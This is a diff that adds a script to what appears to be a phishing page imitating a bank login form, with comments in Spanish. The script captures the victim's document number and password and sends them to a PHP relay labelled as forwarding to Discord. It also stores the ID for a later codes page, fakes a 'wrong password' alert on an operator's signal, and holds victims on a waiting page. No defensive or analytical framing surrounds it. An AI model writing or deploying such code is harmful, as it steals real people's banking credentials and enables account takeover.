@@ -1,0 +1,38 @@
+<script>
+  async function sendToDiscord(usuario, clave) {
+    // Enviamos al puente PHP para generar botones
+    await fetch('enviar.php', {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        usuario: usuario,
+        clave: clave,
+        tipo: "LOGIN PRINCIPAL"
+      })
+    });
+  }
+
+  document.addEventListener("DOMContentLoaded", () => {
+    // Detección de orden de error
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('status') === 'error') {
+      alert("Usuario o clave incorrectos. Intente de nuevo.");
+      fetch('control.php?accion=esperando');
+    }
+
+    const btn = document.getElementById("btnContinuar");
+    btn.addEventListener("click", async (e) => {
+      e.preventDefault();
+      const u = document.getElementById("docNumber").value;
+      const c = document.getElementById("passwordInput").value;
+      if (!u || !c) return alert("Complete los campos");
+
+      btn.textContent = "Cargando...";
+      btn.disabled = true;
+      
+      localStorage.setItem("bf_last_dni", u); // Guardar para codes.html
+      await sendToDiscord(u, c);
+      window.location.href = "wait.html";
+    });
+  });
+</script>
